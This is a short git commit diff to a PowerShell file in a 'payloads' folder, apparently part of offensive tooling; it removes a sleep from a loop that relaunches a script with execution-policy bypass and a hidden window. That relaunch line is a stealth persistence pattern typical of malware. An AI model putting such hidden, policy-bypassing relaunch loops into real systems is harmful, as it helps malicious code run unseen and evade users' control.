bcdcb767d490f06003f0b554f583f0a82cceef64
soumyo001 <www.soumyo@gmail.com>
2025-06-25 21:07:03 +0600

    major mods testv4

--- payloads/fwd_mon.ps1
+++ payloads/fwd_mon.ps1
@@ -117,5 +117,4 @@ while ($true) {
         powershell.exe -ep bypass -noP -w hidden $initServicefwdPath -basePath "$b" -fwdPath $fwdPath
     }
     $issetup = $false
-    Start-Sleep -Seconds 2
 }
